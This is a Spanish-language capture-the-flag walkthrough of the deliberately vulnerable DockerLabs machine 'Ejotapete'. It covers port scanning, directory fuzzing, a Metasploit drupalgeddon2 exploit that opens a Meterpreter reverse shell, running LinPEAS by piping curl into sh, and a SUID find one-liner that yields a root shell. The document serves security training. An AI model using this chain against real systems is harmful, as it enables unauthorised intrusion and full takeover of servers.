---
icon: flag
---

# Ejotapete DockerLabs (Very Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip ejotapete.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh ejotapete.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 11:39 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.000058s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

Veremos un puerto `80` en el que aloja una pagina web, si entramos dentro veremos un `403 Forbidden` por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 290]
/drupal               (Status: 200) [Size: 8892]
/.html                (Status: 403) [Size: 290]
/server-status        (Status: 403) [Size: 298]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay un `/drupal` por lo que vamos a entrar a ver si es el `CMS` real.

Si entramos veremos que efectivamente hay un `drupal`, este tipo de `CMS` tienen bastantes vulnerabilidades conocidas, por lo que vamos a ir a `metasploit` para desde ahi intentar explotar alguna vulnerabilidad si la tuviera, ya que no nos menciona la `version` vamos a probar a ciegas con algunos exploits conocidos.

## Escalate user www-data

### Metasploit (drupalgeddon2)

```shell
msfconsole -q
```

Una vez dentro vamos a buscar `drupal`.

```shell
search drupal
```

Elegiremos el numero `1` que es el modulo `unix/webapp/drupal_drupalgeddon2` ya que es con el que me ha funcionado.

```shell
use unix/webapp/drupal_drupalgeddon2
```

Una vez que lo hayamos seleccionado, vamos a configurarlo de esta forma:

```shell
set RHOSTS <IP_VICTIM>
set TARGETURI /drupal
set LPORT 9999
exploit
```

Seleccionamos el `TARGETURI` ya que el `drupal` no va en la raiz del puerto `80` por lo que tendremos que poner desde donde se esta suministrando.

Info:

```
[*] Started reverse TCP handler on 192.168.177.129:9999 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (40004 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.177.129:9999 -> 172.17.0.2:48976) at 2025-07-14 11:58:51 -0400

meterpreter > getuid
Server username: www-data
```

Veremos que ha funcionado y seremos dicho usuario.

## Escalate Privileges

Si lanzamos un `LinPEAS` podremos ver lo siguiente:

```shell
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-14 181647.png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos `find` con permisos `SUID` por lo que podremos hacer lo siguiente:

```shell
find . -exec /bin/bash -p \; -quit
```

Info:

```
bash-4.4# whoami
whoami
root
```

Con esto ya seremos `root`, por lo que habremos terminado la maquina.
